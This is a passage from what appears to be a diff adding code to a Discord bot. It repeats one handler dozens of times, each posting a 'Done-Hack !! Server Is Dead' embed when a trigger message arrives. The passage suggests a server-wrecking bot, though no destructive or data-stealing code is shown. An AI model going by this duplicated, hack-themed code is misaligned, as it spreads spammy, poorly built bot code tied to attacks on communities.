+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
+   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
+  message.channel.sendMessage(embed);
+  message.author.sendEmbed(embed)
+ }
+});
+client.on('message', message => {
+ if (message.content === x_x) {
+  const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
